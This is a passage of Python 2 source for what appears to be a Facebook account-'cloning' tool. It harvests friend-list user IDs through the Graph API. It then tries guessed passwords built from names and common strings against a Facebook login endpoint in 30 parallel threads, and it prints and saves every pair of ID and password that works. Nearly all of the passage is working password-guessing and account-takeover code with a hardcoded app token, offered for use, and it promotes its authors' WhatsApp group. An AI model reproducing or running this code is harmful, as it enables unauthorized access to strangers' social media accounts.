        print "\033[1;93m-•◈•-\033[1;93m> \033[1;93m6 .\x1b[1;95m Start Cloning All Country    "
        time.sleep(0.05)
        print "\033[1;93m-•◈•-\033[1;93m> \033[1;93m7 .\033[1;95m Start Cloning Indian Old     "
        time.sleep(0.05)
        print "\033[1;93m-•◈•-\033[1;93m> \033[1;93m8 .\033[1;95m Start Cloning Pakistan Old   "
        time.sleep(0.05)
        print "\033[1;93m-•◈•-\033[1;93m> \033[1;93m9 .\033[1;95m Start Cloning M-Asim   "
        time.sleep(0.05)
        print "\033[1;93m-•◈•-\033[1;93m> \033[1;93m10.\033[1;95m Start Cloning pak Testing    "
        time.sleep(0.05)
        print "\033[1;93m-•◈•-\033[1;93m> \033[1;93m11.\x1b[1;92m Start Cloning Group uncomplete "
        time.sleep(0.05)
	print "\033[1;93m-•◈•-\033[1;91m> \033[1;91m0 .\033[1;91m Back"
	pilih_crack()

def pilih_crack():
	peak = raw_input("\n\033[1;91mChoose an Option>>> \033[1;95m")
	if peak =="":
		print "\x1b[1;91mFill in correctly"
		pilih_crack()
	elif peak =="1":
		os.system('clear')
		print logo
		jjt = raw_input("\033[1;96m[+] \033[1;93mEnter ID\033[1;93m: \033[1;97m")
		print "\033[1;95m«-----------------\033[1;91mRana_Nadeem\033[1;95m-----------------»"
		try:
			m = requests.get("https://graph.facebook.com/"+jjt+"?access_token="+toket)
			td = json.loads(m.text)
			print"\033[1;93mName\033[1;93m:\033[1;97m "+td["name"]
		except KeyError:
			print"\x1b[1;91mID Not Found!"
			raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
			crack()
		print"\033[1;93mGetting IDs\033[1;93m..."
		n = requests.get("https://graph.facebook.com/"+jjt+"/friends?access_token="+toket)
		d = json.loads(n.text)
		for c in d['data']:
			id.append(c['id'])
        elif peak =="2":
	        super()
        elif peak =="3":
	        hack()
        elif peak =="4":
	        black()
        elif peak =="5":
	        mafia()
        elif peak =="6":
	        test()
        elif peak =="7":
	        phone()
        elif peak =="8":
	        mail()
        elif peak =="9":
	        isi()
        elif peak =="10":
	        army()
        elif peak =="11":
                clone_dari_member_group ()
	elif peak =="0":
		menu()
	else:
		print "\x1b[1;91mFill in correctly"
		pilih_crack()
	
	print "\033[1;93mTotal IDs\033[1;93m: \033[1;97m"+str(len(id))
	jalan('\033[1;93mPlease Wait\033[1;93m...')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;93mCloning\033[1;93m"+o),;sys.stdout.flush();time.sleep(1)
	print "\n\033[1;97m«-----\x1b[1;91m【To Stop Process Press CTRL+Z】\033[1;97m----»"
	print "\033[1;97m«--------------------\033[1;92m▣\033[1;97m--------------------»"
	jalan(' \033[1;93mPlz Wait Cloned Accounts Will Appear Here')
        jalan(' \033[1;95m         Start Cloning Pakistan ')
	print "\033[1;97m«--------------------\033[1;92m▣\033[1;97m--------------------»"
	
			
	def main(arg):
		global cekpoint,oks
		user = arg
		try:
			os.mkdir('cookie')
		except OSError:
			pass #Dev:M_Asim
		try:
			k = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
			y = json.loads(k.text)
			pass1 = ('786786')
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			s = json.load(data)
			if 'access_token' in s:
				print '\x1b[1;92mLive\x1b[1;97m \x1b[1;92m▣\x1b[1;97m ' + user + ' \x1b[1;92m▣\x1b[1;97m ' + pass1
				oks.append(user+pass1)
			else:
				if 'www.facebook.com' in s["error_msg"]:
					print '\x1b[1;91mError\x1b[1;97m \x1b[1;91m▣\x1b[1;97m ' + user + ' \x1b[1;91m▣\x1b[1;97m ' + pass1
					cek = open("out/checkpoint.txt", "k")
					cek.write(user+"|"+pass1+"\n")
					cek.close()
					cekpoint.append(user+pass1)
				else:
					pass2 = 'Pakistan'
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					s = json.load(data)
					if 'access_token' in s:
						print '\x1b[1;92mLive\x1b[1;97m \x1b[1;92m▣\x1b[1;97m ' + user + ' \x1b[1;92m▣\x1b[1;97m ' + pass2
						oks.append(user+pass2)
					else:
						if 'www.facebook.com' in s["error_msg"]:
							print '\x1b[1;91mError\x1b[1;97m \x1b[1;91m▣\x1b[1;97m ' + user + ' \x1b[1;91m▣\x1b[1;97m ' + pass2
							cek = open("out/checkpoint.txt", "k")
							cek.write(user+"|"+pass2+"\n")
							cek.close()
							cekpoint.append(user+pass2)
						else:
							pass3 = y['first_name'] + '123'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							s = json.load(data)
							if 'access_token' in s:
								print '\x1b[1;92mLive\x1b[1;97m \x1b[1;92m▣\x1b[1;97m ' + user + ' \x1b[1;92m▣\x1b[1;97m ' + pass3
								oks.append(user+pass3)
							else:
								if 'www.facebook.com' in s["error_msg"]:
									print '\x1b[1;91mError\x1b[1;97m \x1b[1;91m▣\x1b[1;97m ' + user + ' \x1b[1;91m▣\x1b[1;97m ' + pass3
									cek = open("out/checkpoint.txt", "k")
									cek.write(user+"|"+pass3+"\n")
									cek.close()
									cekpoint.append(user+pass3)
								else:
									pass4 = y['first_name'] + '1234'
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									s = json.load(data)
									if 'access_token' in s:
										print '\x1b[1;92mLive\x1b[1;97m \x1b[1;92m▣\x1b[1;97m ' + user + ' \x1b[1;92m▣\x1b[1;97m ' + pass4
										oks.append(user+pass4)
									else:
										if 'www.facebook.com' in s["error_msg"]:
											print '\x1b[1;91mError\x1b[1;97m \x1b[1;91m▣\x1b[1;97m ' + user + ' \x1b[1;91m▣\x1b[1;97m ' + pass4
											cek = open("out/checkpoint.txt", "k")
											cek.write(user+"|"+pass4+"\n")
											cek.close()
											cekpoint.append(user+pass4)
										else:
											pass5 = y['first_name'] + 'Karachi'
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											s = json.load(data)
											if 'access_token' in s:
												print '\x1b[1;92mLive\x1b[1;97m \x1b[1;92m▣\x1b[1;97m ' + user + ' \x1b[1;92m▣\x1b[1;97m ' + pass5
												oks.append(user+pass5)
											else:
												if 'www.facebook.com' in s["error_msg"]:
													print '\x1b[1;91mError\x1b[1;97m \x1b[1;91m▣\x1b[1;97m ' + user + ' \x1b[1;91m▣\x1b[1;97m ' + pass5
													cek = open("out/checkpoint.txt", "k")
													cek.write(user+"|"+pass5+"\n")
													cek.close()
													cekpoint.append(user+pass5)
												else:
													pass6 = y['first_name'] + y['last_name']
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													s = json.load(data)
													if 'access_token' in s:
														print '\x1b[1;92mLive\x1b[1;97m \x1b[1;92m▣\x1b[1;97m ' + user + ' \x1b[1;92m▣\x1b[1;97m ' + pass6
														oks.append(user+pass6)
													else:
														if 'www.facebook.com' in s["error_msg"]:
															print '\x1b[1;91mError\x1b[1;97m \x1b[1;91m▣\x1b[1;97m ' + user + ' \x1b[1;91m▣\x1b[1;97m ' + pass6
															cek = open("out/checkpoint.txt", "k")
															cek.write(user+"|"+pass6+"\n")
															cek.close()
															cekpoint.append(user+pass6)
														else:
															pass7 = '000786'
															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															s = json.load(data)
															if 'access_token' in s:
																print '\x1b[1;92mLive\x1b[1;97m \x1b[1;92m▣\x1b[1;97m ' + user + ' \x1b[1;92m▣\x1b[1;97m ' + pass7
																oks.append(user+pass7)
															else:
																if 'www.facebook.com' in s["error_msg"]:
																	print '\x1b[1;91mError\x1b[1;97m \x1b[1;91m▣\x1b[1;97m ' + user + ' \x1b[1;91m▣\x1b[1;97m ' + pass7
																	cek = open("out/checkpoint.txt", "k")
																	cek.write(user+"|"+pass7+"\n")
																	cek.close()
																	cekpoint.append(user+pass7)
																	
															
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print "\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;91mRana-Nadeem\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
	print "  \033[1;91m«---•◈•---Developed By MR_NADEEM--•◈•---»" #Dev:M_Asim
	print '\033[1;95mProcess Has Been Completed Press➡ Type 0 Enter↩ Next Type 0 (logout)↩\033[1;97m....'
        print '\033[1;95mNext Type (python2 NADEEM0003.py) Next login facebook Start Cloning\033[1;97m....'
	print"\033[1;92mTotal Live/\x1b[1;91mCheckpoint \033[1;93m: \033[1;91m"+str(len(oks))+"\033[1;93m/\033[1;96m"+str(len(cekpoint))
	print """
 
 Don't Worry Your Checkpoint ID Will Be Open After 7 Days 

•\033[1;95m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.
: \033[1;91m ....Rana-Nadeem....... \033[1;95m :
•\033[1;95m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.' 
                WhatsApp Group
              \033[1;91m https://chat.whatsapp.com/GWTPaJVAy1gDHIDgHEw0Ht"""
	
	raw_input("\n\033[1;95m[\033[1;91mBack\033[1;95m]")
	crack()
        
def hack():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\x1b[1;94mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print logo9
	print "\033[1;97m-•◈•-\033[1;97m> \033[1;91m1.\x1b[1;96mClone Friend List Public ID."
        time.sleep(0.05)
	print "\033[1;97m-•◈•-\033[1;91m> \033[1;91m0.\033[1;91mBack"
	pilih_hack()

def pilih_hack():
	peak = raw_input("\n\033[1;91mEnter Number>>> \033[1;95m")
	if peak =="":
		print "\x1b[1;91mFill in correctly"
		pilih_hack()
	elif peak =="1":
		os.system('clear')
		print logo
		idt = raw_input("\033[1;95m[•◈•] \033[1;91mEnter ID\033[1;95m: \033[1;95m")
		print "\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;91mMr-Nadeem\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;91mName\033[1;95m:\033[1;95m "+op["name"]
		except KeyError:
			print"\x1b[1;91mID Not Found!"
			raw_input("\n\033[1;95m[\033[1;91mBack\033[1;95m]")
			hack()
		print"\033[1;91mGetting IDs\033[1;97m..."
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif peak =="0":
		crack()
	else:
		print "\x1b[1;91mFill in correctly"
		pilih_hack()
	
	print "\033[1;95mTotal IDs\033[1;91m: \033[1;95m"+str(len(id))
	jalan('\033[1;91mPlease Wait\033[1;94m...')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;93mCloning\033[1;93m"+o),;sys.stdout.flush();time.sleep(1)
	print "\n\033[1;97m«-----\x1b[1;91m【To Stop Process Press CTRL+Z】\033[1;97m----»"
	print "\033[1;97m«--------------------\033[1;92m▣\033[1;97m--------------------»"
	jalan(' \033[1;93mPlz Wait Cloned Accounts Will Appear Here')
        jalan(' \033[1;95m         Start Cloning Indonesia ')
	print "\033[1;97m«--------------------\033[1;92m▣\033[1;97m--------------------»"
	
			
	def main(arg):
		global cekpoint,oks
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass #Dev:M_Asim
		try:
			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
			b = json.loads(a.text)
			pass1 = ('Kantol123')
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if 'access_token' in q:
				print '\x1b[1;92mLive\x1b[1;97m \x1b[1;92m▣\x1b[1;97m ' + user + ' \x1b[1;92m▣\x1b[1;97m ' + pass1
				oks.append(user+pass1)
			else:
				if 'www.facebook.com' in q["error_msg"]:
					print '\x1b[1;91mError\x1b[1;97m \x1b[1;91m▣\x1b[1;97m ' + user + ' \x1b[1;91m▣\x1b[1;97m ' + pass1
					cek = open("out/checkpoint.txt", "a")
					cek.write(user+"|"+pass1+"\n")
					cek.close()
					cekpoint.append(user+pass1)
				else:
					pass2 = 'Sayang123'
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					q = json.load(data)
					if 'access_token' in q:
						print '\x1b[1;92mLive\x1b[1;97m \x1b[1;92m▣\x1b[1;97m ' + user + ' \x1b[1;92m▣\x1b[1;97m ' + pass2
						oks.append(user+pass2)
					else:
						if 'www.facebook.com' in q["error_msg"]:
							print '\x1b[1;91mError\x1b[1;97m \x1b[1;91m▣\x1b[1;97m ' + user + ' \x1b[1;91m▣\x1b[1;97m ' + pass2
							cek = open("out/checkpoint.txt", "a")
							cek.write(user+"|"+pass2+"\n")
							cek.close()
							cekpoint.append(user+pass2)
						else:
							pass3 = b['first_name'] + '12345'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							q = json.load(data)
							if 'access_token' in q:
								print '\x1b[1;92mLive\x1b[1;97m \x1b[1;92m▣\x1b[1;97m ' + user + ' \x1b[1;92m▣\x1b[1;97m ' + pass3
								oks.append(user+pass3)
							else:
								if 'www.facebook.com' in q["error_msg"]:
									print '\x1b[1;91mError\x1b[1;97m \x1b[1;91m▣\x1b[1;97m ' + user + ' \x1b[1;91m▣\x1b[1;97m ' + pass3
									cek = open("out/checkpoint.txt", "a")
									cek.write(user+"|"+pass3+"\n")
									cek.close()
									cekpoint.append(user+pass3)
								else:
									pass4 = b['first_name'] + '123'
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									q = json.load(data)
									if 'access_token' in q:
										print '\x1b[1;92mLive\x1b[1;97m \x1b[1;92m▣\x1b[1;97m ' + user + ' \x1b[1;92m▣\x1b[1;97m ' + pass4
										oks.append(user+pass4)
									else:
										if 'www.facebook.com' in q["error_msg"]:
											print '\x1b[1;91mError\x1b[1;97m \x1b[1;91m▣\x1b[1;97m ' + user + ' \x1b[1;91m▣\x1b[1;97m ' + pass4
											cek = open("out/checkpoint.txt", "a")
											cek.write(user+"|"+pass4+"\n")
											cek.close()
											cekpoint.append(user+pass4)
										else:
											pass5 = 'Sayang'
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											q = json.load(data)
											if 'access_token' in q:
												print '\x1b[1;92mLive\x1b[1;97m \x1b[1;92m▣\x1b[1;97m ' + user + ' \x1b[1;92m▣\x1b[1;97m ' + pass5
												oks.append(user+pass5)
											else:
												if 'www.facebook.com' in q["error_msg"]:
													print '\x1b[1;91mError\x1b[1;97m \x1b[1;91m▣\x1b[1;97m ' + user + ' \x1b[1;91m▣\x1b[1;97m ' + pass5
													cek = open("out/checkpoint.txt", "a")
													cek.write(user+"|"+pass5+"\n")
													cek.close()
													cekpoint.append(user+pass5)
												else:
													pass6 = b['first_name'] + b['last_name']
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													q = json.load(data)
													if 'access_token' in q:
														print '\x1b[1;92mLive\x1b[1;97m \x1b[1;92m▣\x1b[1;97m ' + user + ' \x1b[1;92m▣\x1b[1;97m ' + pass6
														oks.append(user+pass6)
													else:
														if 'www.facebook.com' in q["error_msg"]:
															print '\x1b[1;91mError\x1b[1;97m \x1b[1;91m▣\x1b[1;97m ' + user + ' \x1b[1;91m▣\x1b[1;97m ' + pass6
															cek = open("out/checkpoint.txt", "a")
															cek.write(user+"|"+pass6+"\n")
															cek.close()
															cekpoint.append(user+pass6)
														else:
															a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
															b = json.loads(a.text)
															pass7 = b['first_name'] + '1234'
															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															q = json.load(data)
															if 'access_token' in q:
																print '\x1b[1;92mLive\x1b[1;97m \x1b[1;92m▣\x1b[1;97m ' + user + ' \x1b[1;92m▣\x1b[1;97m ' + pass7
																oks.append(user+pass7)
															else:
																if 'www.facebook.com' in q["error_msg"]:
																	print '\x1b[1;91mError\x1b[1;97m \x1b[1;91m▣\x1b[1;97m ' + user + ' \x1b[1;91m▣\x1b[1;97m ' + pass7
																	cek = open("out/checkpoint.txt", "a")
																	cek.write(user+"|"+pass7+"\n")
																	cek.close()
																	cekpoint.append(user+pass7)		
											                                       
																	
															
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print "\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;91mRana-Nadeem\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
	print "  \033[1;91m«---•◈•---Developed By Rana Nadeem--•◈•---»" #Dev:M_Asim
	print '\033[1;95mProcess Has Been Completed Press➡ Type 0 Enter↩ Next Type 0 (logout)↩\033[1;97m....'
        print '\033[1;95mNext Type (python2 NADEEM0003.py) Next login facebook Start Cloning\033[1;97m....'
	print"\033[1;92mTotal Live/\x1b[1;91mError \033[1;93m: \033[1;91m"+str(len(oks))+"\033[1;93m/\033[1;96m"+str(len(cekpoint))
	print """
Don't Worry Your Error ID Will Be Open After 7 Days 

•\033[1;95m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.
: \033[1;91m ....Mr Nadeem....... \033[1;95m :
•\033[1;95m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.' 
                WhatsApp Group
              \033[1;91m https://chat.whatsapp.com/GWTPaJVAy1gDHIDgHEw0Ht"""
	
	raw_input("\n\033[1;95m[\033[1;91mBack\033[1;95m]")
	crack()

def black():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\x1b[1;94mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print logo10
	print "\033[1;97m-•◈•-\033[1;97m> \033[1;91m1.\x1b[1;93mClone Friend List Public ID."
        time.sleep(0.05)
	print "\033[1;97m-•◈•-\033[1;91m> \033[1;91m0.\033[1;91mBack"
	pilih_black()

def pilih_black():
	peak = raw_input("\n\033[1;91mEnter Number>>> \033[1;95m")
	if peak =="":
		print "\x1b[1;91mFill in correctly"
		pilih_black()
	elif peak =="1":
		os.system('clear')
		print logo
		idt = raw_input("\033[1;95m[•◈•] \033[1;91mEnter ID\033[1;95m: \033[1;95m")
		print "\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;91mRana-Nadeem\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;91mName\033[1;95m:\033[1;95m "+op["name"]
		except KeyError:
			print"\x1b[1;91mID Not Found!"
			raw_input("\n\033[1;95m[\033[1;91mBack\033[1;95m]")
			black()
		print"\033[1;91mGetting IDs\033[1;97m..."
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif peak =="0":
		crack()
	else:
		print "\x1b[1;91mFill in correctly"
		pilih_black()
	
	print "\033[1;95mTotal IDs\033[1;91m: \033[1;95m"+str(len(id))
	jalan('\033[1;91mPlease Wait\033[1;94m...')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;93mCloning\033[1;93m"+o),;sys.stdout.flush();time.sleep(1)
	print "\n\033[1;97m«-----\x1b[1;91m【To Stop Process Press CTRL+Z】\033[1;97m----»"
	print "\033[1;97m«--------------------\033[1;92m▣\033[1;97m--------------------»"
	jalan(' \033[1;93mPlz Wait Cloned Accounts Will Appear Here')
        jalan(' \033[1;95m         Start Cloning United State ')
	print "\033[1;97m«--------------------\033[1;92m▣\033[1;97m--------------------»"
	
			
	def main(arg):
		global cekpoint,oks
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass #Dev:M_Asim
		try:
			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
			b = json.loads(a.text)
			pass1 = 'David'+b['last_name']
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if 'access_token' in q:
				print '\x1b[1;92mLive\x1b[1;97m \x1b[1;92m▣\x1b[1;97m ' + user + ' \x1b[1;92m▣\x1b[1;97m ' + pass1
				oks.append(user+pass1)
			else:
				if 'www.facebook.com' in q["error_msg"]:
					print '\x1b[1;91mError\x1b[1;97m \x1b[1;91m▣\x1b[1;97m ' + user + ' \x1b[1;91m▣\x1b[1;97m ' + pass1
					cek = open("out/checkpoint.txt", "a")
					cek.write(user+"|"+pass1+"\n")
					cek.close()
					cekpoint.append(user+pass1)
				else:
					pass2 = 'John'+b['last_name']
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					q = json.load(data)
					if 'access_token' in q:
						print '\x1b[1;92mLive\x1b[1;97m \x1b[1;92m▣\x1b[1;97m ' + user + ' \x1b[1;92m▣\x1b[1;97m ' + pass2
						oks.append(user+pass2)
					else:
						if 'www.facebook.com' in q["error_msg"]:
							print '\x1b[1;91mError\x1b[1;97m \x1b[1;91m▣\x1b[1;97m ' + user + ' \x1b[1;91m▣\x1b[1;97m ' + pass2
							cek = open("out/checkpoint.txt", "a")
							cek.write(user+"|"+pass2+"\n")
							cek.close()
							cekpoint.append(user+pass2)
						else:
							pass3 = b['first_name'] + '12345'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							q = json.load(data)
							if 'access_token' in q:
								print '\x1b[1;92mLive\x1b[1;97m \x1b[1;92m▣\x1b[1;97m ' + user + ' \x1b[1;92m▣\x1b[1;97m ' + pass3
								oks.append(user+pass3)
							else:
								if 'www.facebook.com' in q["error_msg"]:
									print '\x1b[1;91mError\x1b[1;97m \x1b[1;91m▣\x1b[1;97m ' + user + ' \x1b[1;91m▣\x1b[1;97m ' + pass3
									cek = open("out/checkpoint.txt", "a")
									cek.write(user+"|"+pass3+"\n")
									cek.close()
									cekpoint.append(user+pass3)
								else:
									pass4 = b['first_name'] + 'name123'
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									q = json.load(data)
									if 'access_token' in q:
										print '\x1b[1;92mLive\x1b[1;97m \x1b[1;92m▣\x1b[1;97m ' + user + ' \x1b[1;92m▣\x1b[1;97m ' + pass4
										oks.append(user+pass4)
									else:
										if 'www.facebook.com' in q["error_msg"]:
											print '\x1b[1;91mError\x1b[1;97m \x1b[1;91m▣\x1b[1;97m ' + user + ' \x1b[1;91m▣\x1b[1;97m ' + pass4
											cek = open("out/checkpoint.txt", "a")
											cek.write(user+"|"+pass4+"\n")
											cek.close()
											cekpoint.append(user+pass4)
										else:
											pass5 = b['first_name'] + 'Brian'
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											q = json.load(data)
											if 'access_token' in q:
												print '\x1b[1;92mLive\x1b[1;97m \x1b[1;92m▣\x1b[1;97m ' + user + ' \x1b[1;92m▣\x1b[1;97m ' + pass5
												oks.append(user+pass5)
											else:
												if 'www.facebook.com' in q["error_msg"]:
													print '\x1b[1;91mError\x1b[1;97m \x1b[1;91m▣\x1b[1;97m ' + user + ' \x1b[1;91m▣\x1b[1;97m ' + pass5
													cek = open("out/checkpoint.txt", "a")
													cek.write(user+"|"+pass5+"\n")
													cek.close()
													cekpoint.append(user+pass5)
												else:
													pass6 = b['first_name'] + b['last_name']
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													q = json.load(data)
													if 'access_token' in q:
														print '\x1b[1;92mLive\x1b[1;97m \x1b[1;92m▣\x1b[1;97m ' + user + ' \x1b[1;92m▣\x1b[1;97m ' + pass6
														oks.append(user+pass6)
													else:
														if 'www.facebook.com' in q["error_msg"]:
															print '\x1b[1;91mError\x1b[1;97m \x1b[1;91m▣\x1b[1;97m ' + user + ' \x1b[1;91m▣\x1b[1;97m ' + pass6
															cek = open("out/checkpoint.txt", "a")
															cek.write(user+"|"+pass6+"\n")
															cek.close()
															cekpoint.append(user+pass6)
														else:
															a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
															b = json.loads(a.text)
															pass7 = 'Justin'+b['last_name']
															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															q = json.load(data)
															if 'access_token' in q:
																print '\x1b[1;92mLive\x1b[1;97m \x1b[1;92m▣\x1b[1;97m ' + user + ' \x1b[1;92m▣\x1b[1;97m ' + pass7
																oks.append(user+pass7)
															else:
																if 'www.facebook.com' in q["error_msg"]:
